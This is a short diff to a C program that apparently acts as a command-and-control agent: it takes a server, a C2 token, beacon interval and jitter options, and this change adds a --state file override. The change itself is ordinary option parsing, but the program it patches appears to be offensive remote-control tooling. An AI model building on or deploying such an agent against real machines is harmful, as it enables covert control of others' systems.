@@ -185,8 +185,11 @@ static const char *get_username(void) {
     return user;
 }
 
+static char g_state_override[1024] = "";   /* --state FILE */
+
 static char *state_path(void) {
     static char path[1024] = "";
+    if (g_state_override[0]) return g_state_override;
     if (path[0]) return path;
     const char *home = getenv(HOME_ENV);
     if (!home) home = ".";
@@ -2510,6 +2513,8 @@ int main(int argc, char *argv[]) {
             g_interval = atoi(argv[++i]);
         else if (strcmp(argv[i], "--jitter") == 0 && i + 1 < argc)
             g_jitter = atoi(argv[++i]);
+        else if (strcmp(argv[i], "--state") == 0 && i + 1 < argc)
+            strncpy(g_state_override, argv[++i], sizeof(g_state_override) - 1);
         else if (strcmp(argv[i], "--verbose") == 0)
             g_verbose = 1;
     }
@@ -2519,7 +2524,7 @@ int main(int argc, char *argv[]) {
     if (!g_token[0])  { char *e = getenv("C2_TOKEN");  if (e) strncpy(g_token, e, sizeof(g_token) - 1); }
 
     if (!g_server[0] || !g_token[0]) {
-        fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--verbose]\n");
+        fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
         return 1;
     }
 
